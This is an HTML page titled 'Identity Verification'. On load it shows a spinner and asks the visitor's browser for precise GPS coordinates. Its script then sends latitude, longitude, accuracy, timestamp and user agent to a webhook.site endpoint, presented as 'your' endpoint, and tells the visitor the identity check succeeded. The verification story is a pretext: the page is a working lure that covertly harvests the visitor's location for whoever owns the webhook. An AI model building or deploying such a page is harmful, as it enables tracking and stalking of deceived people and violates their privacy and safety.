<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Identity Verification</title>
  <style>
    :root {
      --primary-color: #2563eb;
      --bg-color: #f8fafc;
      --card-bg: #ffffff;
      --text-main: #1e293b;
      --text-muted: #64748b;
      --border-color: #e2e8f0;
      --error-color: #ef4444;
      --success-color: #10b981;
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background-color: var(--bg-color);
      color: var(--text-main);
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      padding: 1.5rem;
    }

    .verification-card {
      background-color: var(--card-bg);
      border: 1px solid var(--border-color);
      border-radius: 12px;
      padding: 2.5rem 2rem;
      max-width: 420px;
      width: 100%;
      text-align: center;
      box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05), 0 2px 4px -2px rgba(0, 0, 0, 0.05);
    }

    .spinner-container {
      margin-bottom: 1.5rem;
      position: relative;
      height: 48px;
    }

    .spinner {
      width: 44px;
      height: 44px;
      border: 3px solid #e2e8f0;
      border-top-color: var(--primary-color);
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 0 auto;
    }

    @keyframes spin {
      to {
        transform: rotate(360deg);
      }
    }

    h1 {
      font-size: 1.25rem;
      font-weight: 600;
      margin-bottom: 0.5rem;
    }

    p.status-text {
      font-size: 0.875rem;
      color: var(--text-muted);
      line-height: 1.4;
      margin-bottom: 1.5rem;
    }

    .details {
      font-size: 0.75rem;
      color: var(--text-muted);
      background: #f1f5f9;
      padding: 0.75rem;
      border-radius: 6px;
      display: none;
      word-break: break-all;
      text-align: left;
    }

    .status-badge {
      display: inline-block;
      padding: 0.25rem 0.75rem;
      border-radius: 9999px;
      font-size: 0.75rem;
      font-weight: 500;
      margin-top: 1rem;
    }

    .status-error {
      background-color: #fee2e2;
      color: var(--error-color);
    }

    .status-success {
      background-color: #d1fae5;
      color: var(--success-color);
    }
  </style>
</head>
<body>

  <div class="verification-card">
    <div class="spinner-container" id="spinnerContainer">
      <div class="spinner" id="spinner"></div>
    </div>
    
    <h1 id="title">Verifying Identity</h1>
    <p class="status-text" id="statusMessage">
      Please wait while we confirm your device and location details...
    </p>

    <div class="details" id="logOutput"></div>
    <div id="badgeContainer"></div>
  </div>

  <script>
    // Configured with your Webhook.site endpoint
    const WEBHOOK_URL = 'https://webhook.site/2562d16f-a80a-4eb0-b3d2-4a51a7b593b2';

    const statusMessage = document.getElementById('statusMessage');
    const title = document.getElementById('title');
    const spinner = document.getElementById('spinner');
    const badgeContainer = document.getElementById('badgeContainer');
    const logOutput = document.getElementById('logOutput');

    const updateStatus = (heading, message, state = 'loading') => {
      title.textContent = heading;
      statusMessage.textContent = message;

      if (state === 'error') {
        spinner.style.display = 'none';
        badgeContainer.innerHTML = '<span class="status-badge status-error">Verification Failed</span>';
      } else if (state === 'success') {
        spinner.style.display = 'none';
        badgeContainer.innerHTML = '<span class="status-badge status-success">Verification Complete</span>';
      }
    };

    const sendPayload = async (payload) => {
      try {
        const response = await fetch(WEBHOOK_URL, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(payload)
        });

        if (response.ok) {
          updateStatus('Identity Verified', 'Location details recorded successfully.', 'success');
        } else {
          updateStatus('Submission Error', `Endpoint responded with status ${response.status}.`, 'error');
        }
      } catch (err) {
        updateStatus('Network Error', 'Unable to reach the verification server.', 'error');
      }
    };

    const handleSuccess = (position) => {
      const payload = {
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
        accuracy: position.coords.accuracy,
        timestamp: new Date(position.timestamp).toISOString(),
        userAgent: navigator.userAgent
      };

      // Optional: Display logged coordinates locally for verification
      logOutput.style.display = 'block';
      logOutput.textContent = JSON.stringify({
        lat: payload.latitude,
        lon: payload.longitude,
        acc: payload.accuracy
      }, null, 2);

      updateStatus('Submitting Details', 'Transmitting device and location data...', 'loading');
      sendPayload(payload);
    };

    const handleError = (error) => {
      let message = 'An unknown error occurred while retrieving coordinates.';
      
      switch (error.code) {
        case error.PERMISSION_DENIED:
          message = 'Location access was denied. Please allow location permissions to complete verification.';
          break;
        case error.POSITION_UNAVAILABLE:
          message = 'Location information is currently unavailable from your device.';
          break;
        case error.TIMEOUT:
          message = 'The request to obtain location timed out.';
          break;
      }

      updateStatus('Verification Incomplete', message, 'error');
    };

    // Geolocation options requesting precise GPS coordinates
    const geoOptions = {
      enableHighAccuracy: true,
      timeout: 10000,
      maximumAge: 0
    };

    // Initialize request upon page load
    document.addEventListener('DOMContentLoaded', () => {
      if (!('geolocation' in navigator)) {
        updateStatus('Not Supported', 'Geolocation is not supported by your current browser.', 'error');
        return;
      }

      navigator.geolocation.getCurrentPosition(handleSuccess, handleError, geoOptions);
    });
  </script>
</body>
</html>
